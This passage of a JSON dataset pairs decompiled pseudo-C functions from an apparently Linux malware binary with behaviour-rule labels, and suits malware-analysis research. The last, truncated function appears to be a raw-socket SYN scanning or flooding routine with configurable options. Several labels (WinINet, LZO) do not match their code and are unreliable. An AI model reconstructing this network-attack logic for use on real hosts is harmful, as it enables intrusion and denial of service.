= NULL;\n    if (param_2 == 0) {\n        pcStack220 = 0xffffffff;\n        if (1 / param_2 < 0) {\n            acStack30[4] = '-';\n        }\n    }\n    else {\n        fVar13 = param_2;\n        if (param_2 < 0) {\n            acStack30[4] = '-';\n            fVar13 = -param_2;\n        }\n        if (fVar13 == *0x8055420 * fVar13) {\n            param_3[4] = 0x20;\n            uStack156 = 0x70;\n            iStack152 = 3;\n            if (uStack206 < 'a') {\n                pcStack148 = 0x4;\n            }\n            pcStack148 = pcStack148 + 0x8055430;\n            piVar6 = &iStack144;\n            goto code_r0x08052e1d;\n        }\n        pcStack220 = 0x8;\n        iVar10 = 0xd;\n        iVar4 = 0x1000;\n        param_2 = fVar13;\n        while( true ) {\n            iVar10 = iVar10 + -1;\n            if (*0x8055424 <= fVar13) {\n                fVar14 = param_2 / *(iVar10 * 0xc + 0x8055460);\n                if (*0x8055424 <= fVar14) {\n                    pcStack220 = pcStack220 + iVar4;\n                    param_2 = fVar14;\n                }\n            }\n            else {\n                fVar14 = *(iVar10 * 0xc + 0x8055460) * param_2;\n                if (fVar14 < *0x8055428) {\n                    pcStack220 = pcStack220 + -iVar4;\n                    param_2 = fVar14;\n                }\n            }\n            if (iVar10 == 0) break;\n            iVar4 = iVar4 >> 1;\n        }\n        if (*0x8055428 <= param_2) {\n            param_2 = param_2 / *0x805542c;\n            pcStack220 = pcStack220 + 1;\n        }\n    }\n    pcStack212 = acStack72 + 2;\n    iVar4 = 0;\n    do {\n        iVar10 = 0;\n        uStack196 = ROUND(param_2);\n        pcStack212 = pcStack212 + 9;\n        param_2 = (param_2 - (ROUND(param_2) & 0xffffffff)) * *0x8055428;\n        do {\n            iVar10 = iVar10 + 1;\n            uVar1 = uStack196;\n            uStack196 = uStack196 / 10;\n            pcStack212[-iVar10] = uVar1 % 10 + '0';\n        } while (iVar10 < 9);\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 3);\n    if (uStack206 < 'a') {\n        uStack206 = uStack206 + 0x20;\n        cStack42 = 'E';\n    }\n    iVar4 = iVar9;\n    if (uStack206 == 0x67) {\n        if (0 < iVar9) {\n            iVar9 = iVar9 + -1;\n            iVar4 = iVar9;\n        }\n    }\n    else if ((uStack206 == 0x66) && (iVar4 = iVar9 + pcStack220,  iVar9 + pcStack220 < -1)) {\n        fcn.0804fef9(acStack72, 0x30, 0x15, pcStack212 + -iVar10);\n        pcStack220 = 0xffffffff;\n        iVar4 = -1;\n    }\n    acStack72[0] = '\\0';\n    acStack72[1] = 0x30;\n    if (iVar4 < 0x15) {\n        pcVar5 = acStack72 + iVar4 + 3;\n        bVar2 = '4' < acStack72[iVar4 + 3];\n    }\n    else {\n        pcVar5 = acStack49;\n        bVar2 = false;\n    }\n    do {\n        do {\n            pcVar5 = pcVar5 + -1;\n            *pcVar5 = *pcVar5 + bVar2;\n        } while (*pcVar5 == '0');\n    } while ('9' < *pcVar5);\n    pcVar7 = acStack72 + 1;\n    if (pcVar7 < pcVar5) {\n        pcVar7 = pcVar5;\n        pcVar5 = acStack72 + 2;\n    }\n    else {\n        pcStack220 = pcStack220 + 1;\n        pcVar5 = pcVar7;\n    }\n    pcVar7[1] = '\\0';\n    if (uStack206 == 0x67) {\n        if ((-5 < pcStack220) && (pcStack220 <= iVar4)) {\n            uStack197 = 0x66;\n            iVar9 = iVar4 - pcStack220;\n            goto code_r0x08052c73;\n        }\n        uStack197 = 0x67;\ncode_r0x08052c6f:\n        pcVar8 = NULL;\n    }\n    else {\n        uStack197 = uStack206;\n        if (uStack206 != 0x66) goto code_r0x08052c6f;\ncode_r0x08052c73:\n        pcVar8 = pcStack220;\n        if (pcStack220 < 0) {\n            pcVar5 = pcVar5 + -1;\n            *pcVar5 = '0';\n        }\n    }\n    uStack156 = 0xb0;\n    iStack152 = 1;\n    pcStack148 = &cStack22;\n    pcVar12 = pcVar5 + 1;\n    cStack22 = *pcVar5;\n    pcVar7 = pcVar7 + (1 - pcVar12);\n    uStack21 = 0;\n    if (pcVar8 < 0) {\ncode_r0x08052d01:\n        piVar6 = &iStack144;\n    }\n    else {\n        iStack144 = 0x70;\n        pcStack136 = pcVar12;\n        if (pcVar8 < pcVar7) {\n            if (pcVar8 < 1) {\n                pcVar8 = 0xffffffff;\n                goto code_r0x08052d01;\n            }\n            pcStack140 = pcVar8;\n            pcVar12 = pcVar12 + pcVar8;\n            pcVar7 = pcVar7 + -pcVar8;\n            piVar6 = &iStack132;\n            pcVar8 = 0xffffffff;\n        }\n        else {\n            pcStack140 = pcVar7;\n            if (pcVar8 - pcVar7 < 1) {\n                piVar6 = &iStack132;\n            }\n            else {\n                iStack132 = 0xb0;\n                iStack128 = pcVar8 - pcVar7;\n                uStack124 = 0x8055433;\n                piVar6 = aiStack120;\n            }\n            pcVar8 = 0xffffffff;\n            pcVar7 = NULL;\n        }\n    }\n    if ((((*(param_3 + 3) & 0x10) != 0) || (pcVar7 != NULL)) || ((uStack206 != 0x67 && (0 < iVar9)))) {\n        *piVar6 = 0x70;\n        piVar6[1] = 1;\n        piVar6[2] = 0x8055440;\n        piVar6 = piVar6 + 3;\n    }\n    pcVar8 = pcVar8 + 1;\n    if (pcVar8 != NULL) {\n        *piVar6 = 0xb0;\n        piVar6[1] = -pcVar8;\n        piVar6[2] = 0x8055433;\n        piVar6 = piVar6 + 3;\n    }\n    if (pcVar7 != NULL) {\n        *piVar6 = 0x70;\n        piVar6[1] = pcVar7;\n        piVar6[2] = pcVar12;\n        piVar6 = piVar6 + 3;\n    }\n    if (((uStack206 != 0x67) || ((*(param_3 + 3) & 0x10) != 0)) && (pcVar7 - pcVar8 < iVar9)) {\n        *piVar6 = 0xb0;\n        piVar6[1] = iVar9 - (pcVar7 - pcVar8);\n        piVar6[2] = 0x8055433;\n        piVar6 = piVar6 + 3;\n    }\n    if (uStack197 != 0x66) {\n        if (pcStack220 < 0) {\n            cVar11 = '-';\n            pcStack220 = -pcStack220;\n        }\n        else {\n            cVar11 = '+';\n        }\n        acStack30[3] = 0;\n        iVar9 = 2;\n        pcVar5 = acStack30 + 3;\n        do {\n            do {\n                pcVar8 = pcVar5;\n                pcVar7 = pcStack220 / 10;\n                pcVar5 = pcVar8 + -1;\n                iVar9 = iVar9 + 1;\n                *pcVar5 = pcStack220 % 10 + '0';\n                pcStack220 = pcVar7;\n            } while (iVar9 < 4);\n        } while (pcVar7 != NULL);\n        pcVar8[-2] = cVar11;\n        pcVar8[-3] = cStack42;\n        *piVar6 = 0x70;\n        piVar6[1] = iVar9;\n        piVar6[2] = pcVar8 + -3;\n        piVar6 = piVar6 + 3;\n    }\ncode_r0x08052e1d:\n    piVar3 = &iStack152;\n    do {\n        iVar9 = *piVar3;\n        piVar3 = piVar3 + 3;\n        iStack216 = iStack216 - iVar9;\n    } while (piVar3 < piVar6);\n    pcStack160 = acStack30 + 4;\n    uStack164 = acStack30[4] != '\\0';\n    iStack216 = iStack216 - uStack164;\n    iStack168 = 0xa0;\n    if (0 < iStack216) {\n        if ((*(param_3 + 3) & 8) == 0) {\n            if (param_3[4] == 0x30) {\n                iStack152 = iStack152 + iStack216;\n            }\n            else {\n                uStack164 = uStack164 + iStack216;\n            }\n        }\n        else {\n            *piVar6 = 0xa0;\n            piVar6[1] = iStack216;\n            piVar6[2] = 0x8055433;\n            piVar6 = piVar6 + 3;\n        }\n    }\n    iVar9 = 0;\n    piVar3 = &iStack168;\n    do {\n        iVar4 = (*param_4)(param_1, *piVar3, piVar3[1], piVar3[2]);\n        if (iVar4 != piVar3[1]) {\n            return -1;\n        }\n        piVar3 = piVar3 + 3;\n        iVar9 = iVar9 + iVar4;\n    } while (piVar3 < piVar6);\n    return iVar9;\n}\n",
        "token_count": 3061
    },
    "08052fce": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * fcn.08052fce(char *param_1, uint param_2, char **param_3)\n\n{\n    uchar *puVar1;\n    char *pcVar2;\n    uint in_ECX;\n    uint uVar3;\n    ulong uVar4;\n    \n    if (param_1 == NULL) {\n        param_1 = *param_3;\n    }\n    uVar4 = fcn.08053486(param_1, param_2, in_ECX, in_ECX);\n    uVar3 = uVar4 >> 0x20;\n    param_1 = param_1 + uVar4;\n    if (*param_1 == '\\0') {\n        *param_3 = param_1;\n        param_1 = NULL;\n    }\n    else {\n        puVar1 = fcn.08053027(param_1, param_2, uVar3, uVar3);\n        if (puVar1 == NULL) {\n            pcVar2 = fcn.08053423(param_1, 0, 0, 0);\n        }\n        else {\n            *puVar1 = 0;\n            pcVar2 = puVar1 + 1;\n        }\n        *param_3 = pcVar2;\n    }\n    return param_1;\n}\n",
        "token_count": 277
    },
    "0805304e": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.0805304e(char *param_1, uint32_t *param_2)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iStack20;\n    \n    if (param_1 == NULL) {\ncode_r0x080530da:\n        uVar3 = 0;\n    }\n    else {\n        uVar4 = 0;\n        for (iStack20 = 1; iStack20 < 5; iStack20 = iStack20 + 1) {\n            if ((*(*0x805677c + *param_1 * 2) & 8) == 0) goto code_r0x080530da;\n            uVar5 = 0;\n            while( true ) {\n                cVar1 = *param_1;\n                uVar2 = *(*0x805677c + cVar1 * 2);\n                if ((uVar2 & 8) == 0) break;\n                uVar5 = uVar5 * 10 + -0x30 + cVar1;\n                if (0xff < uVar5) goto code_r0x080530da;\n                param_1 = param_1 + 1;\n            }\n            if (iStack20 < 4) {\n                if (cVar1 != '.') goto code_r0x080530da;\n            }\n            else if ((cVar1 != '\\0') && ((uVar2 & 0x20) == 0)) goto code_r0x080530da;\n            param_1 = param_1 + 1;\n            uVar4 = uVar4 << 8 | uVar5;\n        }\n        uVar3 = 1;\n        if (param_2 != NULL) {\n            *param_2 = uVar4 >> 0x18 | (uVar4 & 0xff0000) >> 8 | (uVar4 & 0xff00) << 8 | uVar4 << 0x18;\n            uVar3 = 1;\n        }\n    }\n    return CONCAT44(iStack20, uVar3);\n}\n",
        "token_count": 476
    },
    "080530fa": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __regparm2 fcn.080530fa(uint param_1, uint param_2, int32_t param_3, int32_t param_4)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint auStack284 [35];\n    int32_t iStack144;\n    uint auStack140 [32];\n    uint32_t uStack12;\n    \n    if (((param_4 == -1) || (param_3 < 1)) || (0x40 < param_3)) {\n        puVar1 = fcn.0804efb0();\n        *puVar1 = 0x16;\n    }\n    else {\n        iStack144 = param_4;\n        iVar2 = 0x20;\n        while (iVar2 = iVar2 + -1,  -1 < iVar2) {\n            auStack140[iVar2] = 0;\n        }\n        iVar2 = fcn.080531cd(auStack140, param_3, param_2, param_2);\n        if (-1 < iVar2) {\n            iVar2 = fcn.080531a9(0x8058cc0, param_3, iVar2, iVar2);\n            uStack12 = -(iVar2 == 0) & 0x10000000;\n            iVar2 = fcn.08051d67(param_3, &iStack144, auStack284);\n            if (-1 < iVar2) {\n                return auStack284[0];\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 334
    },
    "08053265": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.08053265(uint16_t *param_1, uint param_2, uint param_3, uint32_t param_4)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_EDX;\n    uint uVar4;\n    ulong uVar5;\n    uchar auStack44 [16];\n    uint uStack28;\n    uint uStack24;\n    \n    uStack28 = param_2;\n    uStack24 = param_3;\n    if (2 < param_4) {\n        puVar2 = fcn.0804efb0();\n        *puVar2 = 0x16;\n        return 0xffffffff;\n    }\n    iVar1 = *(param_1 + 0x1a);\n    if (iVar1 == 0) {\n        fcn.08051b29(auStack44, fcn.08051b26, param_1 + 0x1c, param_2);\n        fcn.08051b26(param_1 + 0x1c);\n        in_ECX = extraout_ECX;\n        param_3 = extraout_EDX;\n    }\n    if ((*param_1 & 0x40) == 0) {\ncode_r0x080532d7:\n        if (param_4 == 1) {\n            uVar5 = fcn.08053348(param_1, &uStack28, in_ECX, in_ECX);\n            param_3 = uVar5 >> 0x20;\n            iVar3 = uVar5;\n            if (iVar3 < 0) goto code_r0x08053326;\n        }\n        iVar3 = fcn.080533f0(param_1, &uStack28, param_4, param_3);\n        if (-1 < iVar3) {\n            *param_1 = *param_1 & 0xffb8;\n            iVar3 = *(param_1 + 4);\n            uVar4 = 0;\n            *(param_1 + 8) = iVar3;\n            *(param_1 + 10) = iVar3;\n            *(param_1 + 0xc) = iVar3;\n            *(param_1 + 0xe) = iVar3;\n            *(param_1 + 0x16) = 0;\n            *(param_1 + 1) = 0;\n            goto code_r0x08053329;\n        }\n    }\n    else {\n        uVar5 = fcn.0804f1e2(param_1);\n        param_3 = uVar5 >> 0x20;\n        iVar3 = uVar5;\n        in_ECX = extraout_ECX_00;\n        if (iVar3 == 0) goto code_r0x080532d7;\n    }\ncode_r0x08053326:\n    uVar4 = 0xffffffff;\ncode_r0x08053329:\n    if (iVar1 == 0) {\n        fcn.08051b29(auStack44, 1, iVar3, iVar3);\n    }\n    return uVar4;\n}\n",
        "token_count": 697
    },
    "08053348": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.08053348(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    \n    iVar5 = 0;\n    uVar6 = *param_1;\n    if ((((uVar6 & 3) != 0) && (iVar5 = (uVar6 & 3) - 1,  iVar5 != 0)) && ((uVar6 & 0x800) != 0)) {\n        if ((1 < iVar5) || (param_1[10] != 0)) {\n            return 0xffffffff;\n        }\n        iVar5 = (iVar5 - *(param_1 + 3)) + -1;\n        if (0 < param_1[0xb]) {\n            iVar5 = iVar5 - *(param_1 + 2);\n        }\n    }\n    if ((uVar6 & 0x40) == 0) {\n        uVar6 = param_1[5];\n    }\n    else {\n        uVar6 = param_1[2];\n    }\n    uVar1 = *param_2;\n    uVar2 = param_2[1];\n    uVar6 = iVar5 + (uVar6 - param_1[4]);\n    *param_2 = uVar1 - uVar6;\n    param_2[1] = (uVar2 - (uVar6 >> 0x1f)) - (uVar1 < uVar6);\n    uVar3 = param_2[1];\n    if ((uVar2 <= uVar3) && ((param_2[1] != uVar2 && uVar2 <= uVar3 || (uVar1 <= *param_2 && *param_2 != uVar1)))) {\n        uVar6 = -uVar6;\n    }\n    if (uVar6 < 0) {\n        puVar4 = fcn.0804efb0();\n        *puVar4 = 0x4b;\n    }\n    return uVar6;\n}\n",
        "token_count": 481
    },
    "08052f1e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.08052f1e(int32_t param_1, char param_2, uint32_t param_3)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    uint uStack12;\n    \n    uStack12 = CONCAT13(param_2, uStack12);\n    puVar1 = param_1 + param_3;\n    while ((param_3 != 0 && ((puVar1 & 3) != 0))) {\n        puVar1 = puVar1 + -1;\n        if (*puVar1 == param_2) goto code_r0x08052fca;\n        param_3 = param_3 - 1;\n    }\n    puVar3 = puVar1;\n    for (; 3 < param_3; param_3 = param_3 - 4) {\n        puVar4 = puVar3 + -1;\n        uVar2 = CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2)) ^ *puVar4;\n        if ((((uVar2 + 0x7efefeff ^ ~uVar2) & 0x81010100) != 0) &&\n           ((((puVar1 = puVar3 + -1,  *(puVar3 + -1) == param_2 || (puVar1 = puVar3 + -2,  *(puVar3 + -2) == param_2))\n             || (puVar1 = puVar3 + -3,  *(puVar3 + -3) == param_2)) || (puVar1 = puVar4,  *puVar4 == param_2))))\n        goto code_r0x08052fca;\n        puVar3 = puVar4;\n    }\n    do {\n        param_3 = param_3 - 1;\n        if (param_3 == 0xffffffff) {\n            puVar1 = NULL;\n            break;\n        }\n        puVar3 = puVar3 + -1;\n        puVar1 = puVar3;\n    } while (*puVar3 != param_2);\ncode_r0x08052fca:\n    return CONCAT44(uStack12, puVar1);\n}\n",
        "token_count": 507
    },
    "08048630": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.08048630(uint8_t param_1, int32_t *param_2, uint8_t param_3, uint param_4)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint unaff_EDI;\n    uint32_t uStack16;\n    \n    if (param_1 != 0) {\n        uStack16 = uStack16 & 0xffffff | param_3 << 0x18;\n        if (param_3 != *(param_2 + 1)) {\n            uVar4 = 0;\n            piVar2 = param_2;\n            do {\n                param_2 = piVar2 + 2;\n                uVar4 = uVar4 + 1;\n                if (param_1 == uVar4) goto code_r0x08048675;\n                piVar1 = piVar2 + 3;\n                piVar2 = param_2;\n            } while (param_3 != *piVar1);\n        }\n        if (*param_2 != 0) {\n            iVar3 = fcn.0805304e(*param_2, &stack0xfffffffc);\n            uVar5 = 0xffffffff;\n            if (iVar3 != 0) {\n                uVar5 = unaff_EDI;\n            }\n            return CONCAT44(uVar5, uVar5);\n        }\n    }\ncode_r0x08048675:\n    return CONCAT44(uStack16, param_4);\n}\n",
        "token_count": 341
    },
    "08048690": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t fcn.08048690(uint8_t param_1, char **param_2, char param_3, uint32_t param_4)\n\n{\n    char **ppcVar1;\n    char cVar2;\n    char **ppcVar3;\n    bool bVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    char *pcVar9;\n    char *pcVar10;\n    int32_t iVar11;\n    \n    if (param_1 != 0) {\n        if (param_3 != *(param_2 + 1)) {\n            uVar6 = 0;\n            ppcVar3 = param_2;\n            do {\n                param_2 = ppcVar3 + 2;\n                uVar6 = uVar6 + 1;\n                if (param_1 == uVar6) {\n                    return param_4;\n                }\n                ppcVar1 = ppcVar3 + 3;\n                ppcVar3 = param_2;\n            } while (param_3 != *ppcVar1);\n        }\n        pcVar10 = *param_2;\n        if (*param_2 != NULL) {\n            do {\n                do {\n                    pcVar9 = pcVar10;\n                    cVar2 = *pcVar9;\n                    pcVar10 = pcVar9 + 1;\n                } while (cVar2 == ' ');\n            } while ((cVar2 == '\\t') || (cVar2 == '\\n'));\n            if (cVar2 == '-') {\n                cVar2 = *pcVar10;\n                uVar6 = 0x80000000;\n                pcVar10 = pcVar9 + 2;\n                bVar4 = true;\n            }\n            else {\n                if (cVar2 == '+') {\n                    cVar2 = *pcVar10;\n                    pcVar10 = pcVar9 + 2;\n                }\n                uVar6 = 0x7fffffff;\n                bVar4 = false;\n            }\n            uVar5 = uVar6 / 10;\n            uVar8 = 0;\n            iVar11 = 0;\n            do {\n                if (cVar2 - 0x30U < 10) {\n                    iVar7 = cVar2 + -0x30;\n                }\n                else {\n                    iVar7 = 0x37;\n                    if (0x19 < cVar2 + 0xbfU) {\n                        if (0x19 < cVar2 + 0x9fU) {\ncode_r0x0804e8ba:\n                            if (iVar11 < 0) {\n                                return 0x80000000 - !bVar4;\n                            }\n                            if (bVar4) {\n                                uVar8 = -uVar8;\n                            }\n                            return uVar8;\n                        }\n                        iVar7 = 0x57;\n                    }\n                    iVar7 = cVar2 - iVar7;\n                }\n                if (9 < iVar7) goto code_r0x0804e8ba;\n                if (((iVar11 < 0) || (uVar5 <= uVar8 && uVar8 != uVar5)) || ((uVar8 == uVar5 && (uVar6 % 10 < iVar7))))\n                {\n                    iVar11 = -1;\n                }\n                else {\n                    iVar11 = 1;\n                    uVar8 = uVar8 * 10 + iVar7;\n                }\n                cVar2 = *pcVar10;\n                pcVar10 = pcVar10 + 1;\n            } while( true );\n        }\n    }\n    return param_4;\n}\n",
        "token_count": 788
    },
    "0804ea83": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0804ea83(void)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint32_t *puVar3;\n    uint32_t unaff_EBX;\n    uint *puVar4;\n    uint32_t uStack16;\n    uint uStack12;\n    \n    puVar2 = &stack0xfffffff4;\n    do {\n        do {\n            puVar4 = puVar2;\n            puVar4[-1] = unaff_EBX;\n            pcVar1 = swi(0x80);\n            unaff_EBX = (*pcVar1)();\n            puVar2 = puVar4 + 1;\n        } while (unaff_EBX < 0xfffff001);\n        *puVar4 = 0x804eaa5;\n        puVar3 = fcn.0804efb0();\n        unaff_EBX = -unaff_EBX;\n        *puVar3 = unaff_EBX;\n        puVar2 = puVar4 + 1;\n    } while( true );\n}\n",
        "token_count": 226
    },
    "0804ebc8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.0804ebc8(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint unaff_ESI;\n    \n    pcVar1 = swi(0x80);\n    uVar2 = (*pcVar1)();\n    if (0xfffff000 < uVar2) {\n        piVar3 = fcn.0804efb0();\n        *piVar3 = -uVar2;\n        uVar2 = 0xffffffff;\n    }\n    return CONCAT44(unaff_ESI, uVar2);\n}\n",
        "token_count": 130
    },
    "0804f8c4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.0804f8c4(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    \n    iVar1 = *(param_1 + 0x18);\n    *(param_1 + 0x4c) = param_2;\n    if (0 < iVar1) {\n        *(param_1 + 0x1c) = iVar1;\n        *(param_1 + 0x18) = 0;\n        *(param_1 + 4) = 0;\n        *(param_1 + 8) = 0;\n        fcn.0804f906(param_1);\n        *(param_1 + 0x18) = iVar1;\n    }\n    return uStack12;\n}\n",
        "token_count": 171
    },
    "08051ea5": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.08051ea5(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint unaff_ESI;\n    \n    pcVar1 = swi(0x80);\n    uVar2 = (*pcVar1)();\n    if (0xfffff000 < uVar2) {\n        piVar3 = fcn.0804efb0();\n        *piVar3 = -uVar2;\n        uVar2 = 0xffffffff;\n    }\n    return CONCAT44(unaff_ESI, uVar2);\n}\n",
        "token_count": 129
    },
    "080534c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.080534c0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uStack12;\n    \n    pcVar2 = segment.LOAD1;\n    pcVar1 = _segment.LOAD1;\n    if (_segment.LOAD1 != 0xffffffff) {\n        do {\n            pcVar2 = pcVar2 + -4;\n            (*pcVar1)();\n            pcVar1 = *pcVar2;\n        } while (pcVar1 != 0xffffffff);\n    }\n    return uStack12;\n}\n",
        "token_count": 119
    },
    "080499e0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.080499e0(uint8_t param_1, int32_t param_2, uint8_t param_3, uchar *param_4)\n\n{\n    uchar uVar1;\n    uchar uVar2;\n    char cVar3;\n    uint8_t uVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint8_t uVar8;\n    uint8_t uVar9;\n    char cVar10;\n    uint16_t uVar11;\n    uint16_t uVar12;\n    uint16_t uVar13;\n    uint16_t uVar14;\n    ushort uVar15;\n    uint32_t uVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    int32_t iVar21;\n    uint32_t uVar22;\n    uchar *puVar23;\n    int32_t iVar24;\n    uchar *puVar25;\n    uint uVar26;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    int32_t *piVar27;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    ulong uVar28;\n    int32_t iStack372;\n    int32_t iStack368;\n    uint32_t uStack336;\n    uchar auStack312 [20];\n    uint uStack292;\n    uint8_t uStack279;\n    uchar auStack56 [4];\n    int32_t iStack52;\n    ushort uStack40;\n    uint16_t uStack38;\n    int32_t iStack36;\n    uint uStack24;\n    int32_t iStack20;\n    \n    uVar16 = param_1;\n    puVar23 = param_3;\n    iVar17 = fcn.08050b95(uVar16, 0x10);\n    iVar18 = fcn.08050b95(uVar16, 4);\n    uVar1 = fcn.08048690(puVar23, param_4, 2, 0);\n    uVar11 = fcn.08048690(puVar23, param_4, 3, 0xffff);\n    uVar2 = fcn.08048690(puVar23, param_4, 4, 0x40);\n    cVar3 = fcn.08048690(puVar23, param_4, 5, 1);\n    uVar12 = fcn.08048690(puVar23, param_4, 7, 0xffff);\n    uVar4 = fcn.08048690(puVar23, param_4, 0xb, 0);\n    uVar5 = fcn.08048690(puVar23, param_4, 0xc, 1);\n    uStack336 = CONCAT13(uVar5, CONCAT12(uVar4, uVar12));\n    uVar6 = fcn.08048690(puVar23, param_4, 0xd, 1);\n    uVar7 = fcn.08048690(puVar23, param_4, 0xe, 0);\n    uVar8 = fcn.08048690(puVar23, param_4, 0xf, 0);\n    uVar9 = fcn.08048690(puVar23, param_4, 0x10, 0);\n    iVar19 = fcn.08048690(puVar23, param_4, 0, 0x300);\n    cVar10 = fcn.08048690(puVar23, param_4, 1, 1);\n    iVar20 = fcn.080503d0(2, 3, 6);\n    if (iVar20 == -1) {\n        do {\n            fcn.08051819(1);\n            fcn.08051819(1);\n        } while( true );\n    }\n    iStack20 = 1;\n    iVar21 = fcn.08050395(iVar20, 0, 3, &iStack20, 4);\n    if (iVar21 == -1) {\n        fcn.0804eaab(iVar20);\n        do {\n            fcn.08051819(1);\n        } while( true );\n    }\n    iStack20 = 0;\n    if (uVar16 != 0) {\n        uVar26 = extraout_ECX;\n        do {\n            while( true ) {\n                uVar28 = fcn.080503d0(2, 1, 0, uVar26);\n                iVar21 = uVar28;\n                uVar26 = extraout_ECX_00;\n                if (iVar21 == -1) break;\n                uVar22 = fcn.0804e9ed(iVar21, 3, 0, uVar28 >> 0x20);\n                fcn.0804e9ed(iVar21, 4, uVar22 | 0x800);\n                uStack40 = 2;\n                iVar24 = param_2 + iStack20 * 0x18;\n                if (*(iVar24 + 0x14) < 0x20) {\n                    uVar26 = *(iVar24 + 0x10);\n                    uVar22 = fcn.0804db30();\n                    uVar14 = uVar26;\n                    uVar13 = uVar26 >> 0x10;\n                    iVar24 = (uVar22 >> (*(param_2 + 0x14 + iStack20 * 0x18) & 0x1f)) +\n                             CONCAT22(uVar14 >> 8 | uVar14 << 8, uVar13 >> 8 | uVar13 << 8);\n                    uVar14 = iVar24;\n                    uVar13 = iVar24 >> 0x10;\n                    iStack36 = CONCAT22(uVar14 >> 8 | uVar14 << 8, uVar13 >> 8 | uVar13 << 8);\n                }\n                else {\n                    iStack36 = *(iVar24 + 0x10);\n                }\n                if (uVar12 == 0xffff) {\n                    uVar22 = fcn.0804db30();\n                    uStack38 = uVar22;\n                }\n                else {\n                    uStack38 = uVar12 >> 8 | uVar12 << 8;\n                    uVar22 = uStack336 & 0xffff0000 | uStack38;\n                }\n                fcn.080501f5(iVar21, &uStack40, 0x10, uVar22);\n                puVar23 = fcn.0804ecea(0);\n                puVar25 = puVar23;\n                do {\n                    uStack24 = 0x10;\n                    uVar22 = fcn.080502dc(iVar20, auStack312, 0x100, 0x4000, auStack56, &uStack24, puVar25, puVar25);\n                    iVar24 = iStack20;\n                    if (uVar22 == 0xffffffff) {\n                        return;\n                    }\n                    if (((iStack52 == iStack36) && (0x28 < uVar22)) && (uStack292 == uStack38)) {\n                        if ((uStack279 & 0x12) == 0x12) {\n                            piVar27 = iStack20 * 0x10 + iVar17;\n                            *piVar27 = iStack36;\n                            uVar14 = *(param_4 + 4);\n                            uVar13 = *(param_4 + 4) >> 0x10;\n                            piVar27[1] = CONCAT22(uVar14 >> 8 | uVar14 << 8, uVar13 >> 8 | uVar13 << 